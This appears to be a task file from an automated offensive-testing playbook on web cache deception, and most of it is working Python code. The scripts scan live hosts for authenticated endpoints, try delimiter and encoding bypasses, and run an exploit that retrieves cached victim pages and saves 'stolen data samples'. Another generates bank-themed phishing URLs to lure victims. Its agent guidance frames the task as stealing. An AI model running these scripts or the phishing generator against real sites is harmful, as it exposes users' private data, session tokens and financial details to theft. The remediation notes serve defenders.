@@ -1,0 +1,901 @@
+================================================================================
+TASK 85 - WEB CACHE DECEPTION
+================================================================================
+Covers testing_toolkit.txt Phase 12 Step 40
+Trick cache into storing sensitive user data for attacker to retrieve
+
+CRITICAL DIFFERENCE FROM CACHE POISONING:
+- Poisoning: Attacker injects MALICIOUS content into cache
+- Deception: Attacker tricks cache into storing VICTIM'S PRIVATE data
+
+ATTACK FLOW:
+1. Victim visits: example.com/account/settings/innocent.css
+2. Server returns: User's account page (ignores .css extension)
+3. Cache stores: Response as static file (because .css)
+4. Attacker visits: Same URL, gets victim's data from cache!
+
+================================================================================
+INPUTS
+================================================================================
+outputs/live_base_urls.txt                 <- Live hosts
+outputs/cache/cache_behavior_map.txt       <- From Task 84
+
+================================================================================
+OUTPUTS
+================================================================================
+outputs/cache/
+    deception_endpoints.txt                <- Endpoints vulnerable to deception
+    deception_techniques.txt               <- Working techniques per host
+    stolen_data_samples.txt                <- Evidence of data leakage
+    deception_confirmed.txt                <- Confirmed vulnerable targets
+
+outputs/vulnerabilities/CACHE-DECEPTION-*-CRITICAL.md
+
+================================================================================
+🧠 AGENT DECISION FRAMEWORK
+================================================================================
+
+THINK: You're not injecting - you're STEALING. Different mindset.
+
+    What data can you steal?
+    |
+    +-- User Profile Data
+    |   +-- /profile/anything.css -> user's profile
+    |   +-- Contains: email, name, settings
+    |
+    +-- Session/Auth Data
+    |   +-- /account/whatever.js -> account page
+    |   +-- Contains: tokens, session info
+    |
+    +-- Financial Data
+    |   +-- /billing/fake.css -> billing info
+    |   +-- Contains: card details, addresses
+    |
+    +-- API Responses
+        +-- /api/user/x.css -> user JSON
+        +-- Contains: full user object
+
+    What makes it work?
+    |
+    +-- Server behavior:
+    |   +-- Ignores path suffix when routing
+    |   +-- /account/settings processes same as /account/settings.css
+    |
+    +-- Cache behavior:
+    |   +-- Caches based on file extension
+    |   +-- .css/.js/.png = "static" = cache it
+    |
+    +-- Mismatch = vulnerability
+
+    Attack requirements:
+    |
+    +-- 1. Authenticated endpoint (has user data)
+    +-- 2. Server processes despite extension
+    +-- 3. Cache stores based on extension
+    +-- 4. Attacker can access same cache
+
+================================================================================
+PHASE 1: UNDERSTAND CACHE DECEPTION
+================================================================================
+
+-----------------------------------------
+1.1 Attack Scenarios
+-----------------------------------------
+SCENARIO 1: Path Parameter Deception
+
+Normal URL:     https://bank.com/account/settings
+Deceptive URL:  https://bank.com/account/settings/anything.css
+
+If server ignores "/anything.css" and serves settings page,
+AND cache stores it as static file,
+= Attacker retrieves victim's settings
+
+SCENARIO 2: Encoded Character Deception
+
+Normal URL:     https://site.com/api/user
+Deceptive URL:  https://site.com/api/user%2f..%2fstatic.css
+
+URL-encoded traversal tricks server but cache keys on .css
+
+SCENARIO 3: Fragment/Query Deception
+
+Normal URL:     https://site.com/dashboard
+Deceptive URL:  https://site.com/dashboard;.css
+
+Semicolon path parameter ignored by server, cached by proxy
+
+-----------------------------------------
+1.2 Why It Works
+-----------------------------------------
+                        SERVER                    CACHE
+                          |                         |
+    /account/x.css -----> |  "route = /account"     |  "extension = .css"
+                          |  (ignores /x.css)       |  (cache static!)
+                          |                         |
+                          v                         v
+                    Returns account         Stores response as
+                    page with user          cacheable static file
+                    data                    
+
+RESULT: Private data cached publicly
+
+================================================================================
+PHASE 2: DETECTION
+================================================================================
+
+-----------------------------------------
+2.1 Path Extension Test
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+cache_deception_detect.py - Detect cache deception vulnerabilities
+
+Test if server processes same content for:
+  /private/page  and  /private/page/anything.css
+"""
+
+import requests
+import hashlib
+import difflib
+import os
+
+requests.packages.urllib3.disable_warnings()
+
+# Extensions that caches typically store
+STATIC_EXTENSIONS = [
+    '.css',
+    '.js', 
+    '.png',
+    '.jpg',
+    '.gif',
+    '.ico',
+    '.svg',
+    '.woff',
+    '.woff2',
+    '.ttf',
+    '.pdf',
+    '.txt',
+]
+
+# Path suffixes to try
+PATH_SUFFIXES = [
+    '/nonexistent.css',
+    '/fake.js',
+    '/x.png',
+    '/..%2f..%2f..%2fstatic.css',
+    ';.css',
+    '%2f.css',
+    '/.css',
+    '/aaa.css',
+    '/;x=.css',
+]
+
+def compare_responses(resp1, resp2, threshold=0.8):
+    """Check if responses are similar (same content)"""
+    
+    text1 = resp1.text[:5000]  # Compare first 5KB
+    text2 = resp2.text[:5000]
+    
+    ratio = difflib.SequenceMatcher(None, text1, text2).ratio()
+    return ratio > threshold
+
+def test_path_deception(base_url, path):
+    """Test if path is vulnerable to cache deception"""
+    
+    results = []
+    target = f"{base_url}{path}"
+    
+    print(f"[*] Testing: {target}")
+    
+    # Get original response
+    try:
+        original = requests.get(target, verify=False, timeout=10)
+        original_status = original.status_code
+        original_length = len(original.text)
+    except:
+        return results
+    
+    # Test each suffix
+    for suffix in PATH_SUFFIXES:
+        deceptive_url = f"{target}{suffix}"
+        
+        try:
+            resp = requests.get(deceptive_url, verify=False, timeout=10)
+            
+            # Check if same content returned
+            if resp.status_code == original_status:
+                if compare_responses(original, resp):
+                    # Content is same! Check if cached
+                    cache_headers = []
+                    for h in ['X-Cache', 'CF-Cache-Status', 'Age', 'Cache-Control']:
+                        if h in resp.headers:
+                            cache_headers.append(f"{h}: {resp.headers[h]}")
+                    
+                    results.append({
+                        'original': target,
+                        'deceptive': deceptive_url,
+                        'suffix': suffix,
+                        'status': resp.status_code,
+                        'cache_headers': cache_headers,
+                        'same_content': True
+                    })
+                    print(f"[+] SAME CONTENT: {suffix}")
+                    
+        except Exception as e:
+            pass
+    
+    return results
+
+# Authenticated endpoints to test
+PRIVATE_PATHS = [
+    '/account',
+    '/profile',
+    '/settings',
+    '/dashboard',
+    '/api/me',
+    '/api/user',
+    '/user/profile',
+    '/my-account',
+    '/billing',
+    '/orders',
+]
+
+os.makedirs('outputs/cache', exist_ok=True)
+
+all_findings = []
+
+with open('outputs/live_base_urls.txt') as f:
+    for line in f:
+        base_url = line.strip().rstrip('/')
+        
+        for path in PRIVATE_PATHS:
+            findings = test_path_deception(base_url, path)
+            all_findings.extend(findings)
+
+# Save findings
+with open('outputs/cache/deception_endpoints.txt', 'w') as f:
+    f.write("# CACHE DECEPTION VULNERABLE ENDPOINTS\n")
+    f.write("# Original URL -> Deceptive URL -> Cache Headers\n\n")
+    for finding in all_findings:
+        f.write(f"Original: {finding['original']}\n")
+        f.write(f"Deceptive: {finding['deceptive']}\n")
+        f.write(f"Cache: {', '.join(finding['cache_headers'])}\n")
+        f.write("---\n")
+
+print(f"\n[*] Found {len(all_findings)} potential deception points")
+
+-----------------------------------------
+2.2 Delimiter Confusion Test
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+delimiter_confusion.py - Test path delimiter handling differences
+
+Different systems treat these differently:
+  /path;param.css  - Semicolon path parameter
+  /path%00.css     - Null byte
+  /path%2f.css     - Encoded slash
+  /path/.css       - Empty segment
+"""
+
+import requests
+import urllib.parse
+
+requests.packages.urllib3.disable_warnings()
+
+DELIMITERS = [
+    (';.css', 'semicolon'),
+    ('%00.css', 'null_byte'),
+    ('%0a.css', 'newline'),
+    ('%09.css', 'tab'),
+    ('%20.css', 'space'),
+    ('?.css', 'query'),
+    ('#.css', 'fragment'),
+    ('/.css', 'empty_segment'),
+    ('/../.css', 'traversal'),
+    ('%2f.css', 'encoded_slash'),
+    ('!.css', 'exclamation'),
+    ('\\.css', 'backslash'),
+]
+
+def test_delimiter(url, delimiter, name):
+    """Test specific delimiter behavior"""
+    
+    test_url = f"{url}{delimiter}"
+    
+    try:
+        resp = requests.get(test_url, verify=False, timeout=10, allow_redirects=False)
+        
+        return {
+            'delimiter': name,
+            'url': test_url,
+            'status': resp.status_code,
+            'length': len(resp.text),
+            'cached': 'HIT' in str(resp.headers.get('X-Cache', '')) or 
+                      'HIT' in str(resp.headers.get('CF-Cache-Status', ''))
+        }
+    except:
+        return None
+
+# Test each target
+with open('outputs/cache/cache_behavior_map.txt') as f:
+    for line in f:
+        if line.startswith('#'):
+            continue
+        url = line.strip().split('|')[0]
+        
+        print(f"\n[*] Testing delimiters on: {url}")
+        
+        baseline = requests.get(url, verify=False, timeout=10)
+        baseline_len = len(baseline.text)
+        
+        for delim, name in DELIMITERS:
+            result = test_delimiter(url, delim, name)
+            if result:
+                # Same length = same content = potential deception
+                if abs(result['length'] - baseline_len) < 100:
+                    indicator = "[!] SAME" if result['cached'] else "[+] Possible"
+                    print(f"  {indicator}: {name} -> {result['status']}, {result['length']}b")
+
+================================================================================
+PHASE 3: EXPLOITATION
+================================================================================
+
+-----------------------------------------
+3.1 Steal User Data
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+cache_deception_exploit.py - Exploit cache deception to steal user data
+
+ATTACK FLOW:
+1. Identify deception-vulnerable endpoint (from detection)
+2. Craft deceptive URL for that endpoint
+3. Send URL to victim (phishing, social engineering)
+4. Victim visits URL (authenticated)
+5. Cache stores victim's response
+6. Attacker visits same URL, retrieves victim's data
+"""
+
+import requests
+import time
+
+def craft_deception_url(authenticated_endpoint):
+    """Create deceptive URL for authenticated endpoint"""
+    
+    # Best suffixes for deception
+    deception_suffixes = [
+        '/nonexistent.css',
+        '/x.js',
+        ';.css',
+        '/..%2fstatic.css',
+    ]
+    
+    urls = []
+    for suffix in deception_suffixes:
+        urls.append(f"{authenticated_endpoint}{suffix}")
+    
+    return urls
+
+def exploit_deception(deceptive_url, session_cookie=None):
+    """
+    Two-phase exploitation:
+    1. As victim (with session) - populate cache
+    2. As attacker (no session) - steal from cache
+    """
+    
+    print(f"[*] Exploiting: {deceptive_url}")
+    
+    # Phase 1: Victim visit (simulated - in real attack, victim clicks link)
+    if session_cookie:
+        print("[*] Phase 1: Victim request (populates cache)")
+        victim_resp = requests.get(
+            deceptive_url,
+            cookies={'session': session_cookie},
+            verify=False,
+            timeout=10
+        )
+        print(f"    Victim response: {victim_resp.status_code}, {len(victim_resp.text)} bytes")
+    
+    # Wait for cache propagation
+    time.sleep(1)
+    
+    # Phase 2: Attacker retrieval (no auth)
+    print("[*] Phase 2: Attacker request (retrieves from cache)")
+    attacker_resp = requests.get(
+        deceptive_url,
+        verify=False,
+        timeout=10
+    )
+    
+    # Check for sensitive data in cached response
+    sensitive_indicators = [
+        'email',
+        'password',
+        'token',
+        'session',
+        'api_key',
+        'credit_card',
+        'ssn',
+        'phone',
+        '@',  # Email addresses
+        'balance',
+        'account',
+    ]
+    
+    found_sensitive = []
+    response_lower = attacker_resp.text.lower()
+    
+    for indicator in sensitive_indicators:
+        if indicator in response_lower:
+            found_sensitive.append(indicator)
+    
+    if found_sensitive:
+        print(f"[CRITICAL] SENSITIVE DATA IN CACHED RESPONSE!")
+        print(f"[CRITICAL] Found indicators: {', '.join(found_sensitive)}")
+        return {
+            'url': deceptive_url,
+            'status': 'VULNERABLE',
+            'sensitive_data': found_sensitive,
+            'response_sample': attacker_resp.text[:500]
+        }
+    
+    return None
+
+# Exploit known vulnerable endpoints
+results = []
+
+with open('outputs/cache/deception_endpoints.txt') as f:
+    content = f.read()
+    
+    # Parse deceptive URLs
+    for line in content.split('\n'):
+        if line.startswith('Deceptive:'):
+            url = line.replace('Deceptive:', '').strip()
+            result = exploit_deception(url)
+            if result:
+                results.append(result)
+
+# Save stolen data evidence
+with open('outputs/cache/stolen_data_samples.txt', 'w') as f:
+    for r in results:
+        f.write(f"URL: {r['url']}\n")
+        f.write(f"Sensitive Data Types: {', '.join(r['sensitive_data'])}\n")
+        f.write(f"Sample:\n{r['response_sample']}\n")
+        f.write("="*60 + "\n")
+
+-----------------------------------------
+3.2 Generate Phishing URLs
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+Generate deception URLs for social engineering
+
+These URLs look legitimate but trick cache:
+- https://bank.com/account/security-check.css
+- https://shop.com/orders/receipt.pdf
+
+Victim clicks, their data gets cached, attacker retrieves.
+"""
+
+def generate_phishing_url(base_url, context):
+    """Generate convincing deceptive URLs"""
+    
+    templates = {
+        'bank': [
+            '/account/security-verification.css',
+            '/profile/update-required.js',
+            '/settings/new-policy.pdf',
+        ],
+        'shopping': [
+            '/orders/latest-receipt.pdf',
+            '/account/reward-points.css',
+            '/cart/special-offer.js',
+        ],
+        'social': [
+            '/profile/friend-request.css',
+            '/messages/new-notification.js',
+            '/settings/privacy-update.pdf',
+        ],
+        'general': [
+            '/account/important-notice.css',
+            '/profile/verify-identity.js',
+            '/dashboard/action-required.pdf',
+        ]
+    }
+    
+    urls = []
+    for suffix in templates.get(context, templates['general']):
+        urls.append(f"{base_url}{suffix}")
+    
+    return urls
+
+# Generate for all vulnerable hosts
+phishing_urls = []
+
+with open('outputs/cache/deception_endpoints.txt') as f:
+    for line in f:
+        if line.startswith('Original:'):
+            base = line.replace('Original:', '').strip()
+            urls = generate_phishing_url(base, 'general')
+            phishing_urls.extend(urls)
+
+# Save phishing URL collection
+with open('outputs/cache/deception_phishing_urls.txt', 'w') as f:
+    f.write("# CACHE DECEPTION PHISHING URLs\n")
+    f.write("# Send to victim, then retrieve cached response\n\n")
+    for url in phishing_urls:
+        f.write(f"{url}\n")
+
+================================================================================
+PHASE 4: VARIATIONS & BYPASSES
+================================================================================
+
+-----------------------------------------
+4.1 Normalization Bypass
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+normalization_bypass.py - Bypass cache deception protections
+
+Some servers normalize paths. Test bypass techniques:
+"""
+
+import requests
+import urllib.parse
+
+requests.packages.urllib3.disable_warnings()
+
+def test_normalization_bypasses(base_url, path):
+    """Test various normalization bypasses"""
+    
+    bypasses = [
+        # Double encoding
+        (f"{path}%252f..%252fstatic.css", "double_encode"),
+        
+        # Mixed case
+        (f"{path}/X.CSS", "uppercase_ext"),
+        (f"{path}/x.CsS", "mixed_case"),
+        
+        # Unicode normalization
+        (f"{path}/x.ｃｓｓ", "fullwidth"),
+        
+        # Dot variations  
+        (f"{path}/x.css.", "trailing_dot"),
+        (f"{path}/x..css", "double_dot"),
+        
+        # Length extension
+        (f"{path}/{'a'*200}.css", "long_filename"),
+        
+        # Multiple extensions
+        (f"{path}/x.php.css", "double_ext"),
+        (f"{path}/x.css.bak", "backup_ext"),
+    ]
+    
+    target = f"{base_url}{path}"
+    results = []
+    
+    try:
+        baseline = requests.get(target, verify=False, timeout=10)
+        baseline_hash = hash(baseline.text[:1000])
+    except:
+        return results
+    
+    for bypass_path, name in bypasses:
+        try:
+            url = f"{base_url}{bypass_path}"
+            resp = requests.get(url, verify=False, timeout=10)
+            
+            if hash(resp.text[:1000]) == baseline_hash:
+                print(f"[+] BYPASS: {name} -> same content")
+                results.append({
+                    'technique': name,
+                    'url': url,
+                    'status': resp.status_code
+                })
+        except:
+            pass
+    
+    return results
+
+-----------------------------------------
+4.2 RPO (Relative Path Overwrite)
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+rpo_test.py - Relative Path Overwrite for cache deception
+
+RPO exploits how browsers resolve relative URLs:
+
+Page: /account/settings
+CSS:  <link href="style.css">
+
+If attacker gets victim to visit:
+/account/settings/..%2f..%2f/evil
+
+Browser resolves CSS as:
+/account/settings/..%2f..%2f/style.css
+
+= Different cached resource loaded!
+"""
+
+import requests
+
+def test_rpo(url):
+    """Test for RPO vulnerability"""
+    
+    resp = requests.get(url, verify=False, timeout=10)
+    
+    # Find relative CSS/JS references
+    relative_refs = []
+    
+    import re
+    
+    # href="something.css" (not absolute)
+    css_refs = re.findall(r'href=["\']([^"\']+\.css)["\']', resp.text)
+    js_refs = re.findall(r'src=["\']([^"\']+\.js)["\']', resp.text)
+    
+    for ref in css_refs + js_refs:
+        if not ref.startswith('http') and not ref.startswith('//'):
+            relative_refs.append(ref)
+    
+    if relative_refs:
+        print(f"[+] Found {len(relative_refs)} relative references")
+        print(f"    Potential RPO target!")
+        return relative_refs
+    
+    return None
+
+================================================================================
+PHASE 5: FULL AUTOMATION
+================================================================================
+
+#!/usr/bin/env python3
+"""
+cache_deception_full.py - Complete cache deception scanner
+"""
+
+import os
+import json
+import requests
+import difflib
+import hashlib
+import time
+
+requests.packages.urllib3.disable_warnings()
+
+class CacheDeceptionScanner:
+    
+    STATIC_EXTENSIONS = ['.css', '.js', '.png', '.jpg', '.gif', '.ico', '.pdf']
+    
+    PATH_SUFFIXES = [
+        '/nonexistent.css',
+        '/fake.js',
+        '/x.png',
+        ';.css',
+        '/.css',
+        '%2f.css',
+    ]
+    
+    PRIVATE_PATHS = [
+        '/account',
+        '/profile', 
+        '/settings',
+        '/dashboard',
+        '/api/me',
+        '/api/user',
+        '/my-account',
+        '/billing',
+    ]
+    
+    def __init__(self):
+        self.results = {
+            'deception_vulnerable': [],
+            'techniques': [],
+            'confirmed': []
+        }
+        os.makedirs('outputs/cache', exist_ok=True)
+        os.makedirs('outputs/vulnerabilities', exist_ok=True)
+    
+    def compare_responses(self, resp1, resp2, threshold=0.8):
+        """Check if responses are substantially similar"""
+        text1 = resp1.text[:3000]
+        text2 = resp2.text[:3000]
+        ratio = difflib.SequenceMatcher(None, text1, text2).ratio()
+        return ratio > threshold
+    
+    def test_path_deception(self, base_url, path):
+        """Test if path vulnerable to cache deception"""
+        
+        target = f"{base_url}{path}"
+        findings = []
+        
+        try:
+            original = requests.get(target, verify=False, timeout=10)
+            if original.status_code != 200:
+                return findings
+        except:
+            return findings
+        
+        for suffix in self.PATH_SUFFIXES:
+            deceptive = f"{target}{suffix}"
+            
+            try:
+                resp = requests.get(deceptive, verify=False, timeout=10)
+                
+                if resp.status_code == 200 and self.compare_responses(original, resp):
+                    # Check caching
+                    cache_status = None
+                    for h in ['X-Cache', 'CF-Cache-Status', 'Age']:
+                        if h in resp.headers:
+                            cache_status = resp.headers[h]
+                            break
+                    
+                    findings.append({
+                        'original': target,
+                        'deceptive': deceptive,
+                        'suffix': suffix,
+                        'cached': cache_status
+                    })
+            except:
+                pass
+        
+        return findings
+    
+    def verify_deception(self, deceptive_url):
+        """Verify cache stores response"""
+        
+        # Add unique marker
+        marker = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
+        test_url = f"{deceptive_url}?v={marker}"
+        
+        try:
+            # First request
+            resp1 = requests.get(test_url, verify=False, timeout=10)
+            
+            time.sleep(1)
+            
+            # Second request - should come from cache
+            resp2 = requests.get(test_url, verify=False, timeout=10)
+            
+            # Check Age header increased or X-Cache shows HIT
+            age1 = int(resp1.headers.get('Age', 0))
+            age2 = int(resp2.headers.get('Age', 0))
+            
+            if age2 > age1:
+                return True
+            
+            if 'HIT' in resp2.headers.get('X-Cache', ''):
+                return True
+            if 'HIT' in resp2.headers.get('CF-Cache-Status', ''):
+                return True
+                
+        except:
+            pass
+        
+        return False
+    
+    def generate_report(self, finding):
+        """Generate vulnerability report"""
+        
+        vuln_id = hashlib.md5(finding['deceptive'].encode()).hexdigest()[:8]
+        
+        report = f"""# Web Cache Deception Vulnerability
+
+**Severity**: CRITICAL  
+**Original URL**: {finding['original']}
+**Deceptive URL**: {finding['deceptive']}
+
+## Description
+The application is vulnerable to web cache deception. An attacker can craft 
+a URL that causes the victim's private data to be cached and retrieved.
+
+## Attack Flow
+1. Attacker crafts URL: `{finding['deceptive']}`
+2. Victim clicks link (via phishing, social engineering)
+3. Server returns private data (ignores .css extension)
+4. Cache stores response (sees .css, thinks static)
+5. Attacker requests same URL, gets victim's data from cache
+
+## Impact
+- Steal user profile information
+- Steal session tokens
+- Steal financial data
+- Account takeover via stolen tokens
+
+## Remediation
+1. Ensure path handling is strict (404 for invalid paths)
+2. Don't cache authenticated responses
+3. Include authentication state in cache key
+4. Validate file extensions actually match content
+"""
+        
+        with open(f"outputs/vulnerabilities/CACHE-DECEPTION-{vuln_id}-CRITICAL.md", 'w') as f:
+            f.write(report)
+    
+    def scan(self, urls_file):
+        """Full scan"""
+        
+        with open(urls_file) as f:
+            urls = [l.strip() for l in f if l.strip()]
+        
+        print(f"[*] Scanning {len(urls)} URLs for cache deception...")
+        
+        for base_url in urls:
+            print(f"\n[*] Testing: {base_url}")
+            
+            for path in self.PRIVATE_PATHS:
+                findings = self.test_path_deception(base_url, path)
+                
+                for finding in findings:
+                    print(f"[+] Potential deception: {finding['suffix']}")
+                    self.results['deception_vulnerable'].append(finding)
+                    
+                    # Verify caching
+                    if self.verify_deception(finding['deceptive']):
+                        print(f"[CRITICAL] CONFIRMED CACHEABLE!")
+                        self.results['confirmed'].append(finding)
+                        self.generate_report(finding)
+        
+        return self.results
+    
+    def save(self):
+        """Save results"""
+        
+        with open('outputs/cache/deception_results.json', 'w') as f:
+            json.dump(self.results, f, indent=2)
+        
+        with open('outputs/cache/deception_confirmed.txt', 'w') as f:
+            for c in self.results['confirmed']:
+                f.write(f"{c['deceptive']}\n")
+
+# Run
+if __name__ == "__main__":
+    scanner = CacheDeceptionScanner()
+    scanner.scan('outputs/live_base_urls.txt')
+    scanner.save()
+    
+    print(f"\n{'='*60}")
+    print(f"[*] Potential deception points: {len(scanner.results['deception_vulnerable'])}")
+    print(f"[*] CONFIRMED VULNERABLE: {len(scanner.results['confirmed'])}")
+
+================================================================================
+SUMMARY CHECKLIST  
+================================================================================
+
+[ ] Path extension deception tested on all authenticated endpoints
+[ ] Delimiter confusion tested (semicolon, null byte, encoding)
+[ ] Normalization bypasses attempted
+[ ] Cache storage verified for findings
+[ ] Phishing URLs generated for confirmed vulns
+[ ] Vulnerability reports created
+
+================================================================================
+TOOLS REFERENCE
+================================================================================
+
+TECHNIQUES:
+1. Path Extension (/.css, /.js, /.png)
+2. Delimiter Injection (;.css, %00.css)
+3. Encoding Bypass (%2f, double-encode)
+4. RPO (Relative Path Overwrite)
+
+TARGET ENDPOINTS:
+- /account, /profile, /settings
+- /api/me, /api/user
+- Any authenticated page with user data
+
+INDICATORS OF SUCCESS:
+- Same content returned for /path and /path/x.css
+- Response cached (Age header, X-Cache: HIT)
+- No authentication required for cached response
+
+SEVERITY: CRITICAL
+- Direct access to user private data
+- Session token theft
+- Financial information exposure
+
+================================================================================
+NEXT TASK
+================================================================================
+Task 86: ESI Injection (Edge Side Includes)
